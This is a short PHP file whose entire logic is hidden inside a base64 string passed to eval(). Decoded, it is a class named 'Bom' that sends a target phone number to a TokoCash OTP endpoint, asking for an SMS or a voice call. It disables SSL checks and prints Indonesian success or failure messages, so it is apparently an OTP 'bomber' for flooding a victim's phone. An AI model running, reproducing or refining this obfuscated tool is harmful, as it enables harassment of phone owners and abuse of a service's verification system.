<?php eval("?>".base64_decode("PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCg0KQ2xhc3MgQm9tIHsNCg0KICAgICAgICBwdWJsaWMgJG5vOw0KICAgIHB1YmxpYyAkdHlwZTsNCg0KICAgICAgICBwdWJsaWMgZnVuY3Rpb24gc2VuZEMoJHVybCwgJHBhZ2UsICRwYXJhbXMpIHsNCg0KICAgICAgICAkY2ggPSBjdXJsX2luaXQoKTsNCiAgICAgICAgY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwuJHBhZ2UpOw0KICAgICAgICBjdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDYuMTsgZW4tVVM7IHJ2OjEuOC4xLjYpIEdlY2tvLzIwMDcwNzI1IEZpcmVmb3gvMi4wLjAuNiIpOw0KICAgICAgICBjdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsNCg0KICAgICAgICBpZighZW1wdHkoJHBhcmFtcykpIHsNCiAgICAgICAgY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAkcGFyYW1zKTsNCiAgICAgICAgY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9QT1NULCAxKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIDApOw0KICAgICAgICBjdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX0NPT0tJRUpBUiwgJ2Nvb2tpZS50eHQnKTsNCiAgICAgICAgY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9DT09LSUVGSUxFLCAnY29va2llLnR4dCcpOw0KICAgICAgICBjdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsNCg0KICAgICAgICAkaGVhZGVycyAgPSBhcnJheSgpOw0KICAgICAgICAkaGVhZGVyc1tdID0gJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PXV0Zi04JzsNCiAgICAgICAgJGhlYWRlcnNbXSA9ICdYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdCc7DQoNCiAgICAgICAgY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9IVFRQSEVBREVSLCAkaGVhZGVycyk7DQogICAgICAgIC8vY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9IRUFERVIsIDEpOw0KICAgICAgICAkcmVzdWx0ID0gY3VybF9leGVjICgkY2gpOw0KICAgICAgICBjdXJsX2Nsb3NlKCRjaCk7DQogICAgICAgIHJldHVybiAkcmVzdWx0Ow0KDQogICAgfQ0KDQogICAgcHJpdmF0ZSBmdW5jdGlvbiBnZXRTdHIoJHN0YXJ0LCAkZW5kLCAkc3RyaW5nKSB7DQogICAgICAgIGlmICghZW1wdHkoJHN0cmluZykpIHsNCiAgICAgICAgJHNldHJpbmcgPSBleHBsb2RlKCRzdGFydCwkc3RyaW5nKTsNCiAgICAgICAgJHNldHJpbmcgPSBleHBsb2RlKCRlbmQsJHNldHJpbmdbMV0pOw0KICAgICAgICByZXR1cm4gJHNldHJpbmdbMF07DQogICAgICAgIH0NCiAgICB9DQoNCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBWZXJpZigpDQogICAgew0KICAgICAgICAkdXJsID0gImh0dHBzOi8vd3d3LnRva29jYXNoLmNvbS9vYXV0aC9vdHAiOw0KICAgICAgICAkbm8gPSAkdGhpcy0+bm87DQogICAgICAgICR0eXBlID0gJHRoaXMtPnR5cGU7DQogICAgICAgIGlmICgkdHlwZSA9PSAxKSB7DQogICAgICAgICAgICAkZGF0YSA9ICJtc2lzZG49eyRub30mYWNjZXB0PSI7DQogICAgICAgIH1lbHNlaWYgKCR0eXBlID09IDIpIHsNCiAgICAgICAgICAgICRkYXRhID0gIm1zaXNkbj17JG5vfSZhY2NlcHQ9Y2FsbCI7DQogICAgICAgIH0NCiAgICAgICAgJHNlbmQgPSAkdGhpcy0+c2VuZEMoJHVybCwgbnVsbCwgJGRhdGEpOw0KICAgICAgICAvLyBlY2hvICRzZW5kOw0KICAgICAgICBpZiAocHJlZ19tYXRjaCgnL290cF9hdHRlbXB0X2xlZnQvJywgJHNlbmQpKSB7DQogICAgICAgICAgICAgICAgcHJpbnQoJ1tPVFBdPVNVS1NFUyBESUtJUk0gbicpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBwcmludCgnW09UUF09R0FHQUwgREkgS0lSSU0gbicpOw0KICAgICAgICAgICAgfQ0KICAgIH0NCg0KDQp9")); ?>